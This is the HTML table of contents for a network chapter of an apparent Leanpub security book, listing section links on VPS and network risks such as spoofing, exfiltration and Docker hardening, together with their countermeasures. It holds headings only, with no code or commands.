<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>8. Network</title>
  <link href="stylesheet.css" rel="stylesheet" />
</head>
<body dir="ltr" class="kramdown">
<div id="leanpub-toc">
<h2></h2>
<ol class="toc">
<ul class='toc no-parts'>
  <li>
    <a href='chap00.html#leanpub-auto-foreword'>Foreword</a>
  </li>
  <li>
    <a href='chap01.html#leanpub-auto-preface'>Preface</a>
    <ul>
      <li>
        <a href='chap01.html#leanpub-auto-description'>Description</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-purpose'>Purpose</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-reason'>Reason</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-acknowledgements'>Acknowledgements</a>
      </li>
      <li>
        <a href='chap01.html#leanpub-auto-influences'>Influences</a>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap02.html#leanpub-auto-introduction'>Introduction</a>
  </li>
  <li>
    <a href='chap03.html#vps'>7. VPS</a>
    <ul>
      <li>
        <a href='chap03.html#vps-asset-identification'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap03.html#leanpub-auto-ssm-identify-risks'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap03.html#vps-identify-risks-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-Windows'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#vps-identify-risks-psexec'>PsExec</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-windows-pth-suite-of-metasploit-modules'>Pass The Hash (PTH) suite of Metasploit Modules</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell'>PowerShell</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-executable-psmsf'>PowerShell Exploitation via Executable C/- Psmsf</a>
                <ul>
                  <li>
                    <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details'>PowerShell Payload creation details</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-evolution'>PowerShell Exploitation Evolution</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang'>PowerShell Exploitation via Office Documents C/- Nishang</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-adding-persistence-co-meterpreter'>Adding Persistence C/- Meterpreter</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-adding-persistence-co-powersploit'>Adding Persistence C/- PowerSploit</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-unnecessary-and-vulnerable-services'>Unnecessary and Vulnerable Services</a>
            <ul>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation'>Overly Permissive File Permissions, Ownership and Lack of Segmentation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-weak-password-strategies'>Weak Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-root-logins'>Root Logins</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ssh'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-to-many-boot-options'>To Many Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-portmap'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim'>EXIM</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-nis'>NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-telnet'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-lack-of-visibility'>Lack of Visibility</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-docker'>Docker</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-consumption-from-registrieshttpsdocsdockercomregistry'>Consumption from Registries</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-doppelganger-images'>Doppelganger images</a>
              </li>
              <li>
                <a href='chap03.html#vps-identify-risks-docker-the-default-user-is-root'>The Default User is Root</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-docker-host-engine-and-containers'>Docker Host, Engine and Containers</a>
                <ul>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces'>Namespaces</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-control-groups'>Control Groups</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-capabilities'>Capabilities</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules'>Linux Security Modules (LSM)</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-identify-risks-docker-docker-engine-and-containers-seccomp'>SecComp</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-read-only-containers'>Read-only Containers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-application-security'>Application Security</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-using-components-with-known-vulnerabilities'>Using Components with Known Vulnerabilities</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-backup'>Lack of Backup</a>
          </li>
          <li>
            <a href='chap03.html#vps-identify-risks-lack-of-firewall'>Lack of Firewall</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap03.html#vps-countermeasures-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-psexec-pth'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-powershell-exploitation-with-persistence'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-apt-proxy-set-up'>Apt Proxy Set-up</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies'>Review Password Strategies</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-considerhttpslistsdebianorgdebian-user201104msg00550html-changing-to-bcrypt'>Consider changing to Bcrypt</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-password-grub'>Password GRUB</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-root-logins-from-all-terminals'>Disable Root Logins from All Terminals</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh'>SSH</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-symmetric-cryptosystems'>Symmetric Cryptosystems</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-asymmetric-cryptosystems'>Asymmetric Cryptosystems</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-hashing'>Hashing</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure'>SSH Connection Procedure</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint'>Establishing your SSH Servers Key Fingerprint</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh'>Hardening SSH</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh'>Tunneling SSH</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions'>Lock Down the Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpc-portmapper'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim'>Disable, Remove Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet'>Remove Telnet</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp'>Remove FTP</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-nfs'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management'>Web Server Log Management</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-system-loggers-reviewed'>System Loggers Reviewed</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-aims'>Aims</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations'>Environmental Considerations</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up'>Initial Set-Up</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy'>Improving the Strategy</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring'>Proactive Monitoring</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-evaluation-criteria'>Evaluation Criteria</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals'>Goals</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit'>Sysvinit, Upstart, systemd &amp; Runit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever'>forever</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-pm2httppm2keymetricsio'>PM2</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor'>Supervisor</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit'>Monit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger'>Passenger</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit'>Getting Started with Monit</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-keep-monit-alive'>Keep Monit Alive</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive'>Keep NodeJS Application Alive</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-statistics-graphing'>Statistics Graphing</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-collectdhttpscollectdorg'>Collectd</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-graphitehttpgraphiteapporg'>Graphite</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-assembling-the-components'>Assembling the Components</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids'>Host Intrusion Detection Systems (HIDS)</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-tripwirehttpspackagesdebianorgstretchtripwire'>Tripwire</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-rkhunterhttpspackagesdebianorgstretchrkhunter'>RkHunter</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-chkrootkithttpspackagesdebianorgstretchchkrootkit'>Chkrootkit</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide'>Unhide</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-ossec'>Ossec</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-stealthhttpsfbb-gitgithubiostealth'>Stealth</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec'>Deeper with Ossec</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth'>Deeper with Stealth</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-outcomes'>Outcomes</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-stealth-up-and-running'>Stealth Up and Running</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-docker'>Docker</a>
            <ul>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-consumption-from-registries'>Consumption from Registries</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-doppelganger-images-1'>Doppelganger images</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-the-default-user-is-root'>The Default User is Root</a>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers'>Hardening Docker Host, Engine and Containers</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-haskell-dockerfile-linterhttpsgithubcomlukasmartinellihadolint'>Haskell Dockerfile Linter</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-lynishttpscisofycomdownloads'>Lynis</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-docker-benchhttpsgithubcomdockerdocker-bench-security'>Docker Bench</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-coreos-clairhttpsgithubcomcoreosclair'>CoreOS Clair</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-banyanops-collectorhttpsgithubcombanyanopscollector'>Banyanops collector</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-anchorehttpsanchorecomsolutions'>Anchore</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock'>TwistLock</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-possible-contenders-to-watch'>Possible contenders to watch</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces'>Namespaces</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups'>Control Groups</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-capabilities'>Capabilities</a>
                  </li>
                  <li>
                    <a href='chap03.html#leanpub-auto-linux-security-modules-lsm'>Linux Security Modules (LSM)</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-seccomp'>Seccomp</a>
                  </li>
                  <li>
                    <a href='chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers'>Read-only Containers</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-runc-and-where-it-fits-in'>runC and where it fits in</a>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-using-runc-standalonehttpsopensourcecomlife168runc-little-container-engine-could'>Using runC Standalone</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap03.html#vps-countermeasures-docker-application-security'>Application Security</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-using-components-with-known-vulnerabilities'>Using Components with Known Vulnerabilities</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-schedule-backups'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall'>Host Firewall</a>
          </li>
          <li>
            <a href='chap03.html#vps-countermeasures-preparation-for-dmz'>Preparation for DMZ</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-confirm-dmz-has'>Confirm DMZ has</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-additional-web-server-preparation'>Additional Web Server Preparation</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-post-dmz-considerations'>Post DMZ Considerations</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap03.html#leanpub-auto-forfeit-control-thus-security'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows-1'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-psexec-and-pass-the-hash-pth'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-powershell-exploitation-with-persistence'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-1'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-disable-remove-services-harden-what-is-left'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-review-password-strategies'>Review Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ssh-1'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options-1'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions'>Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-portmap'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim-1'>Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis-1'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind-1'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-telnet'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp-1'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs-1'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-logging-and-alerting'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-web-server-log-management'>Web Server Log Management</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-proactive-monitoring'>Proactive Monitoring</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-statistics-graphing'>Statistics Graphing</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-host-intrusion-detection-systems-hids'>Host Intrusion Detection Systems (HIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-docker'>Docker</a>
            <ul>
              <li>
                <span>&#160;</span>
                <ul>
                  <li>
                    <a href='chap03.html#leanpub-auto-linux-security-modules-lsm-1'>Linux Security Modules (LSM)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-schedule-backups'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall-1'>Host Firewall</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap03.html#vps-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap03.html#leanpub-auto-forfeit-control-thus-security-1'>Forfeit Control thus Security</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-windows-2'>Windows</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-psexec-and-pass-the-hash-pth-1'>PsExec and Pass The Hash (PTH)</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-powershell-exploitation-with-persistence-1'>PowerShell Exploitation with Persistence</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-2'>Minimise Attack Surface by Installing Only what you Need</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-disable-remove-services-harden-what-is-left-1'>Disable, Remove Services. Harden what is left</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-partitioning-on-os-installation'>Partitioning on OS Installation</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-review-password-strategies-1'>Review Password Strategies</a>
              </li>
              <li>
                <a href='chap03.html#vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh'>SSH</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-disable-boot-options-2'>Disable Boot Options</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-mounting-of-partitions'>Mounting of Partitions</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-portmap-1'>Portmap</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-exim-2'>Exim</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-remove-nis-2'>Remove NIS</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-rpcbind-2'>Rpcbind</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-telnet-1'>Telnet</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-ftp-2'>FTP</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-nfs-2'>NFS</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-lack-of-visibility-1'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap03.html#leanpub-auto-logging-and-alerting-1'>Logging and Alerting</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-web-server-log-management-1'>Web Server Log Management</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-proactive-monitoring-1'>Proactive Monitoring</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-statistics-graphing-1'>Statistics Graphing</a>
              </li>
              <li>
                <a href='chap03.html#leanpub-auto-host-intrusion-detection-systems-hids-1'>Host Intrusion Detection Systems (HIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-docker-1'>Docker</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-schedule-backups-1'>Schedule Backups</a>
          </li>
          <li>
            <a href='chap03.html#leanpub-auto-host-firewall-2'>Host Firewall</a>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap04.html#network'>8. Network</a>
    <ul>
      <li>
        <a href='chap04.html#leanpub-auto-ssm-asset-identification'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap04.html#leanpub-auto-ssm-identify-risks-1'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap04.html#network-identify-risks-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-2'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-arp'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-referrer'>Referrer</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-email-address'>EMail Address</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-spoofing-website'>Website</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-data-exfiltration-infiltration'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-ingress-and-egress-techniques'>Ingress and Egress Techniques</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-data-exfiltration-infiltration-dropbox'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-doppelganger-domains'>Doppelganger Domains</a>
            <ul>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-websites'>Web-sites</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-smtp'>SMTP</a>
              </li>
              <li>
                <a href='chap04.html#network-identify-risks-doppelganger-domains-ssh'>SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
          </li>
          <li>
            <a href='chap04.html#network-identify-risks-tls-downgrade'>TLS Downgrade</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap04.html#network-countermeasures-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-3'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging'>Insufficient Logging</a>
                <ul>
                  <li>
                    <a href='chap04.html#network-countermeasures-fortress-mentality-insufficient-logging-ntp'>Network Time Protocol (NTP)</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-lack-of-visibility-nids'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-arp'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-referrer'>Referrer</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-email-address'>EMail Address</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-spoofing-website'>Website</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-1'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-1'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-1'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-doppelganger-domains'>Doppelganger Domains</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-websites'>Web-sites</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-smtp'>SMTP</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-doppelganger-domains-ssh'>SSH</a>
              </li>
